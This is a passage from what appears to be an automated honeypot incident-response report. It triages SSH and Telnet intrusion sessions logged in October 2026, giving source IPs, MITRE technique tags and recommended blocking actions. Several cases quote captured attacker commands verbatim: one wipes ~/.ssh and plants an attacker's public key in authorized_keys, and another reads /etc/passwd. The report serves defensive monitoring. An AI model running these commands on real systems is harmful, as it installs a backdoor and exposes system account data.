| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:14:19` | `cowrie.session.connect` |
| `2026-10-11 03:14:19` | `cowrie.client.version` |
| `2026-10-11 03:14:19` | `cowrie.client.kex` |
| `2026-10-11 03:14:20` | `cowrie.login.success` |
| `2026-10-11 03:14:20` | `cowrie.session.params` |
| `2026-10-11 03:14:20` | `cowrie.command.input` |
| `2026-10-11 03:14:20` | `cowrie.command.failed` |
| `2026-10-11 03:14:21` | `cowrie.log.closed` |
| `2026-10-11 03:14:22` | `cowrie.session.params` |
| `2026-10-11 03:14:22` | `cowrie.command.input` |
| `2026-10-11 03:14:22` | `cowrie.session.file_download` |
| `2026-10-11 03:14:22` | `cowrie.log.closed` |
| `2026-10-11 03:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.143.36[.]100` to AbuseIPDB if not already reported
- [ ] Block `104.143.36[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db2e3239e5b

| Field | Detail |
|---|---|
| **Source IP** | `104.143.36[.]100` |
| **First Seen** | 2026-10-11 03:14 |
| **Last Seen** | 2026-10-11 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:14:22` | `cowrie.session.connect` |
| `2026-10-11 03:14:22` | `cowrie.client.version` |
| `2026-10-11 03:14:22` | `cowrie.client.kex` |
| `2026-10-11 03:14:23` | `cowrie.login.success` |
| `2026-10-11 03:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.143.36[.]100` to AbuseIPDB if not already reported
- [ ] Block `104.143.36[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816218342fca

| Field | Detail |
|---|---|
| **Source IP** | `34.77.173[.]19` |
| **First Seen** | 2026-10-11 03:25 |
| **Last Seen** | 2026-10-11 03:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:25:14` | `cowrie.session.connect` |
| `2026-10-11 03:25:14` | `cowrie.login.success` |
| `2026-10-11 03:25:15` | `cowrie.session.params` |
| `2026-10-11 03:25:15` | `cowrie.command.input` |
| `2026-10-11 03:25:15` | `cowrie.command.input` |
| `2026-10-11 03:25:15` | `cowrie.command.failed` |
| `2026-10-11 03:25:15` | `cowrie.command.input` |
| `2026-10-11 03:25:15` | `cowrie.log.closed` |
| `2026-10-11 03:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.173[.]19` to AbuseIPDB if not already reported
- [ ] Block `34.77.173[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb662188039

| Field | Detail |
|---|---|
| **Source IP** | `34.77.173[.]19` |
| **First Seen** | 2026-10-11 03:25 |
| **Last Seen** | 2026-10-11 03:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:25:28` | `cowrie.session.connect` |
| `2026-10-11 03:25:28` | `cowrie.login.success` |
| `2026-10-11 03:25:28` | `cowrie.session.params` |
| `2026-10-11 03:25:28` | `cowrie.command.input` |
| `2026-10-11 03:25:28` | `cowrie.command.failed` |
| `2026-10-11 03:25:37` | `cowrie.log.closed` |
| `2026-10-11 03:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.173[.]19` to AbuseIPDB if not already reported
- [ ] Block `34.77.173[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4667e4ef1236

| Field | Detail |
|---|---|
| **Source IP** | `34.77.173[.]19` |
| **First Seen** | 2026-10-11 03:25 |
| **Last Seen** | 2026-10-11 03:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:25:30` | `cowrie.session.connect` |
| `2026-10-11 03:25:30` | `cowrie.login.success` |
| `2026-10-11 03:25:30` | `cowrie.session.params` |
| `2026-10-11 03:25:30` | `cowrie.command.input` |
| `2026-10-11 03:25:37` | `cowrie.log.closed` |
| `2026-10-11 03:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.173[.]19` to AbuseIPDB if not already reported
- [ ] Block `34.77.173[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-366c3dc36640

| Field | Detail |
|---|---|
| **Source IP** | `165.154.45[.]62` |
| **First Seen** | 2026-10-11 03:29 |
| **Last Seen** | 2026-10-11 03:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:29:58` | `cowrie.session.connect` |
| `2026-10-11 03:29:58` | `cowrie.client.version` |
| `2026-10-11 03:29:58` | `cowrie.client.kex` |
| `2026-10-11 03:29:59` | `cowrie.login.success` |
| `2026-10-11 03:30:00` | `cowrie.session.params` |
| `2026-10-11 03:30:00` | `cowrie.command.input` |
| `2026-10-11 03:30:00` | `cowrie.command.failed` |
| `2026-10-11 03:30:01` | `cowrie.log.closed` |
| `2026-10-11 03:30:01` | `cowrie.session.params` |
| `2026-10-11 03:30:01` | `cowrie.command.input` |
| `2026-10-11 03:30:02` | `cowrie.session.file_download` |
| `2026-10-11 03:30:02` | `cowrie.log.closed` |
| `2026-10-11 03:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.45[.]62` to AbuseIPDB if not already reported
- [ ] Block `165.154.45[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538a90e89f5a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.45[.]62` |
| **First Seen** | 2026-10-11 03:30 |
| **Last Seen** | 2026-10-11 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:30:02` | `cowrie.session.connect` |
| `2026-10-11 03:30:02` | `cowrie.client.version` |
| `2026-10-11 03:30:02` | `cowrie.client.kex` |
| `2026-10-11 03:30:03` | `cowrie.login.success` |
| `2026-10-11 03:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.45[.]62` to AbuseIPDB if not already reported
- [ ] Block `165.154.45[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331220b4e3f2

| Field | Detail |
|---|---|
| **Source IP** | `115.190.253[.]104` |
| **First Seen** | 2026-10-11 03:30 |
| **Last Seen** | 2026-10-11 03:33 |
| **Session Duration** | 181s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:30:53` | `cowrie.session.connect` |
| `2026-10-11 03:30:53` | `cowrie.telnet.option` |
| `2026-10-11 03:30:54` | `cowrie.telnet.option` |
| `2026-10-11 03:30:54` | `cowrie.login.success` |
| `2026-10-11 03:30:55` | `cowrie.session.params` |
| `2026-10-11 03:30:55` | `cowrie.telnet.option` |
| `2026-10-11 03:30:55` | `cowrie.telnet.option` |
| `2026-10-11 03:30:55` | `cowrie.command.input` |
| `2026-10-11 03:30:55` | `cowrie.command.input` |
| `2026-10-11 03:30:55` | `cowrie.command.input` |
| `2026-10-11 03:30:55` | `cowrie.command.input` |
| `2026-10-11 03:30:55` | `cowrie.command.failed` |
| `2026-10-11 03:30:55` | `cowrie.command.input` |
| `2026-10-11 03:30:55` | `cowrie.command.failed` |
| `2026-10-11 03:30:55` | `cowrie.command.input` |
| … | _19 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `115.190.253[.]104` to AbuseIPDB if not already reported
- [ ] Block `115.190.253[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8dc5a2eb662

| Field | Detail |
|---|---|
| **Source IP** | `129.121.142[.]157` |
| **First Seen** | 2026-10-11 03:31 |
| **Last Seen** | 2026-10-11 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:31:12` | `cowrie.session.connect` |
| `2026-10-11 03:31:12` | `cowrie.client.version` |
| `2026-10-11 03:31:12` | `cowrie.client.kex` |
| `2026-10-11 03:31:13` | `cowrie.login.success` |
| `2026-10-11 03:31:13` | `cowrie.session.params` |
| `2026-10-11 03:31:13` | `cowrie.command.input` |
| `2026-10-11 03:31:13` | `cowrie.command.failed` |
| `2026-10-11 03:31:13` | `cowrie.log.closed` |
| `2026-10-11 03:31:14` | `cowrie.session.params` |
| `2026-10-11 03:31:14` | `cowrie.command.input` |
| `2026-10-11 03:31:14` | `cowrie.session.file_download` |
| `2026-10-11 03:31:14` | `cowrie.log.closed` |
| `2026-10-11 03:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.142[.]157` to AbuseIPDB if not already reported
- [ ] Block `129.121.142[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c3834729b4

| Field | Detail |
|---|---|
| **Source IP** | `129.121.142[.]157` |
| **First Seen** | 2026-10-11 03:31 |
| **Last Seen** | 2026-10-11 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 03:31:14` | `cowrie.session.connect` |
| `2026-10-11 03:31:14` | `cowrie.client.version` |
| `2026-10-11 03:31:14` | `cowrie.client.kex` |
| `2026-10-11 03:31:14` | `cowrie.login.success` |
| `2026-10-11 03:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.142[.]157` to AbuseIPDB if not already reported
- [ ] Block `129.121.142[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (130) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e71b45f99acb | HIGH | `162.241.29[.]37` | 2026-10-11 03:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-07c7b213a14d | HIGH | `162.241.29[.]37` | 2026-10-11 03:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4f37a59cd5ba | HIGH | `14.103.107[.]229` | 2026-10-11 03:39 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-a1dabe99903c | HIGH | `120.48.176[.]104` | 2026-10-11 03:39 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-fd66d0bf6bfb | HIGH | `193.112.192[.]91` | 2026-10-11 03:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c51fd0322c91 | HIGH | `195.38.129[.]19` | 2026-10-11 04:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-01e56a0fa53d | HIGH | `195.38.129[.]19` | 2026-10-11 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8892f153b782 | HIGH | `106.13.186[.]96` | 2026-10-11 04:34 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-a6873c83cef4 | HIGH | `34.14.122[.]221` | 2026-10-11 04:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7bead39cbe30 | HIGH | `34.14.122[.]221` | 2026-10-11 04:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e03c06751e1d | HIGH | `120.48.17[.]39` | 2026-10-11 04:41 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-2c4a73d98ae0 | HIGH | `176.53.159[.]196` | 2026-10-11 04:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a60351d6c3a | HIGH | `221.156.126[.]1` | 2026-10-11 04:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4bae45e70136 | HIGH | `221.156.126[.]1` | 2026-10-11 04:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-84cbfb94aaef | HIGH | `14.225.206[.]187` | 2026-10-11 04:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f94209ad009b | HIGH | `14.225.206[.]187` | 2026-10-11 04:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64017e4e8a24 | HIGH | `222.110.147[.]58` | 2026-10-11 04:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0780a2310c35 | HIGH | `222.110.147[.]58` | 2026-10-11 04:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-28bf2e55b89a | HIGH | `202.165.14[.]135` | 2026-10-11 04:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-655b0f1f0bc6 | HIGH | `202.165.14[.]135` | 2026-10-11 04:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c254032444f7 | HIGH | `165.154.156[.]67` | 2026-10-11 04:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8b63cf936196 | HIGH | `165.154.156[.]67` | 2026-10-11 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-924bede88ee1 | HIGH | `43.130.33[.]11` | 2026-10-11 04:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-025a96cfc78b | HIGH | `43.130.33[.]11` | 2026-10-11 04:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a4090a0bea1a | HIGH | `85.198.19[.]242` | 2026-10-11 05:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-10e0d7f93c8f | HIGH | `85.198.19[.]242` | 2026-10-11 05:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6ec3001b1799 | HIGH | `14.36.171[.]104` | 2026-10-11 05:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89cbd471a2bd | HIGH | `14.36.171[.]104` | 2026-10-11 05:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d245575bda30 | HIGH | `72.14.178[.]148` | 2026-10-11 05:39 | Y | 3 | 0 | `T1078` |
| IR-5ea2451c3e8f | HIGH | `172.235.41[.]245` | 2026-10-11 05:56 | Y | 3 | 0 | `T1078` |
| IR-e6ee774013bd | HIGH | `104.168.99[.]216` | 2026-10-11 06:10 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3e0d0aef7f74 | HIGH | `176.53.159[.]196` | 2026-10-11 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0a16e08a04a5 | HIGH | `218.4.214[.]115` | 2026-10-11 06:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e0c7330fe2b0 | HIGH | `36.50.134[.]86` | 2026-10-11 06:26 | Y | 4 | 0 | `T1078 · T1083` |
| IR-debe2ada5ec3 | HIGH | `194.44.117[.]197` | 2026-10-11 06:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ae277a3db744 | HIGH | `2.26.83[.]92` | 2026-10-11 06:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6efa0e73b91f | HIGH | `2.26.83[.]92` | 2026-10-11 06:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b0d3455adfd1 | HIGH | `221.161.235[.]168` | 2026-10-11 06:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6e0cb053b1b9 | HIGH | `221.161.235[.]168` | 2026-10-11 06:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c0085053e6d | HIGH | `37.187.35[.]26` | 2026-10-11 06:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-db346c153280 | HIGH | `94.180.139[.]162` | 2026-10-11 06:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4cde30a9a1c2 | HIGH | `37.187.35[.]26` | 2026-10-11 06:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-caff100f2270 | HIGH | `94.180.139[.]162` | 2026-10-11 06:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de262a0f0d91 | HIGH | `140.246.108[.]106` | 2026-10-11 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-28d2d68b98bd | HIGH | `220.80.223[.]144` | 2026-10-11 06:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b1a118fdc089 | HIGH | `220.80.223[.]144` | 2026-10-11 06:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ebed3bf31d6 | HIGH | `103.159.2[.]113` | 2026-10-11 06:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4ee9e96b6c43 | HIGH | `109.160.32[.]160` | 2026-10-11 07:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e73b4389320b | HIGH | `193.112.192[.]91` | 2026-10-11 07:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-47a327ba6e92 | HIGH | `193.112.192[.]91` | 2026-10-11 07:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5c06a0e83bdf | HIGH | `103.159.2[.]113` | 2026-10-11 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-054c30635cdd | HIGH | `176.53.159[.]196` | 2026-10-11 08:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6a21f04f791e | HIGH | `103.154.63[.]62` | 2026-10-11 08:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e20304a498f0 | HIGH | `103.154.63[.]62` | 2026-10-11 08:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c01c1b1ab249 | HIGH | `129.121.78[.]234` | 2026-10-11 08:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d5921033c36f | HIGH | `129.121.78[.]234` | 2026-10-11 08:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a439822c4bc6 | HIGH | `202.145.0[.]61` | 2026-10-11 08:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-47cfa7c8bbb8 | HIGH | `202.145.0[.]61` | 2026-10-11 08:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-107c983804b8 | HIGH | `36.64.131[.]68` | 2026-10-11 08:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3d57728e7198 | HIGH | `36.64.131[.]68` | 2026-10-11 08:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-29631cd8ea9f | HIGH | `171.244.201[.]80` | 2026-10-11 08:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b3ae04b10e68 | HIGH | `171.244.201[.]80` | 2026-10-11 08:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b85e85faee68 | HIGH | `103.132.243[.]250` | 2026-10-11 09:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0682bde570f2 | HIGH | `103.132.243[.]250` | 2026-10-11 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-267c39f386b5 | HIGH | `216.226.77[.]20` | 2026-10-11 09:23 | Y | 3 | 0 | `T1078` |
| IR-b57ea3b54bd6 | HIGH | `109.160.32[.]47` | 2026-10-11 09:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-baafa395151e | HIGH | `109.160.32[.]47` | 2026-10-11 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-974eff068691 | HIGH | `176.53.159[.]196` | 2026-10-11 10:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-02051c389862 | HIGH | `103.159.2[.]113` | 2026-10-11 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-221378271630 | HIGH | `152.32.254[.]222` | 2026-10-11 10:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f3d9afa0e100 | HIGH | `152.32.254[.]222` | 2026-10-11 10:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0429b0f864b | HIGH | `101.32.240[.]31` | 2026-10-11 10:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2074be8802c0 | HIGH | `101.32.240[.]31` | 2026-10-11 10:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-48565c95e470 | HIGH | `130.12.180[.]32` | 2026-10-11 11:21 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e9f71bce20f5 | HIGH | `190.129.122[.]185` | 2026-10-11 11:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8686ca3e0508 | HIGH | `190.129.122[.]185` | 2026-10-11 11:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cdfcb63ba5ee | HIGH | `193.112.192[.]91` | 2026-10-11 11:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a36d9de81935 | HIGH | `202.165.15[.]132` | 2026-10-11 11:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e21be7e4c1af | HIGH | `202.165.15[.]132` | 2026-10-11 11:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ddb130c9882 | HIGH | `77.90.185[.]20` | 2026-10-11 11:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-45b5da01ccb5 | HIGH | `77.90.185[.]20` | 2026-10-11 11:41 | Y | 1 | 0 | `T1021.004 · T1059.004 · T1078` |
| IR-68a81b55de86 | HIGH | `130.12.180[.]32` | 2026-10-11 12:04 | Y | 1 | 0 | `T1078 · T1592` |
| IR-842bc8a345b4 | HIGH | `92.118.39[.]14` | 2026-10-11 12:07 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-64846cb10a09 | HIGH | `65.49.1[.]232` | 2026-10-11 12:21 | Y | 3 | 0 | `T1078` |
| IR-eac47026b40d | HIGH | `109.160.32[.]46` | 2026-10-11 13:07 | Y | 1 | 0 | `T1078 · T1592` |
| IR-739587ccb9af | HIGH | `47.251.101[.]164` | 2026-10-11 13:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-71c629851d12 | HIGH | `130.12.180[.]51` | 2026-10-11 13:19 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-a601aea9e8a7 | HIGH | `176.53.159[.]196` | 2026-10-11 13:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d96ae9118dd0 | HIGH | `114.12.17[.]98` | 2026-10-11 13:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6fde882ee5bf | HIGH | `114.12.17[.]98` | 2026-10-11 13:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4386d16eb04a | HIGH | `159.112.138[.]47` | 2026-10-11 13:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-907bc7ec1b0c | HIGH | `159.112.138[.]47` | 2026-10-11 13:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8e41f055eeaf | HIGH | `111.238.174[.]6` | 2026-10-11 14:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e936a0e1e1a8 | HIGH | `111.238.174[.]6` | 2026-10-11 14:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4487d695e464 | HIGH | `217.154.169[.]20` | 2026-10-11 14:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5d1dae5d1e2a | HIGH | `217.154.169[.]20` | 2026-10-11 14:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4579bcd2ef57 | HIGH | `115.190.184[.]184` | 2026-10-11 14:07 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-737ca9488b80 | HIGH | `115.190.184[.]184` | 2026-10-11 14:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e04a9d6fbd8b | HIGH | `42.81.126[.]27` | 2026-10-11 14:09 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-038dcf5552c6 | HIGH | `14.29.201[.]186` | 2026-10-11 14:10 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
_… 30 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `79.116.196[.]2` | **5** | 2026-10-11 08:07 | 2026-10-11 16:09 | 10m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-11 01:06 | 2026-10-11 04:13 | 0m | 0 | `T1592` | 🟢 LOW |
